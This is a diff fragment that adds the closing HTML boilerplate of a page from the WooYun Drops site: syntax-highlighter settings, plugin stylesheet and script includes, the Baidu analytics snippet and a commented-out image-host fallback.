+	SyntaxHighlighter.config.strings.noBrush = '无法找到Brush：';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush不能设置 html-script选项';
+	SyntaxHighlighter.defaults['auto-links'] = false;
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+</script>
+<link rel='stylesheet' id='wp-easyarchives-css'  href='http://drops.wooyun.org/wp-content/plugins/wp-easyarchives/css/wp-easyarchives.css?ver=3.1' type='text/css' media='screen' />
+<link rel='stylesheet' id='wp-recentcomments-css'  href='http://drops.wooyun.org/wp-content/plugins/wp-recentcomments/css/wp-recentcomments.css?ver=2.2.5' type='text/css' media='screen' />
+<script type='text/javascript' src='http://drops.wooyun.org/wp-includes/js/jquery/jquery.js?ver=1.7.2'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/wp-recentcomments/js/wp-recentcomments.js?ver=2.2.5'></script>
+<span style="float: right;">感谢知乎授权页面模版</span>
+<!-- 百度统计-->
+<div style="display:none">
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F9fc41da6a2322bdd80563c9d5a4bdb1d' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</div>
+</body>
+<script>
+</script>
+<script>
+/*
+$("img").bind('error', function(){
+  img_src = $(this).attr("src");
+  new_src = img_src.replace('static.wooyun.org', 'wooyun.b0.upaiyun.com');
+  $(this).attr("src", new_src);
+})
+*/
+</script>
+</html>
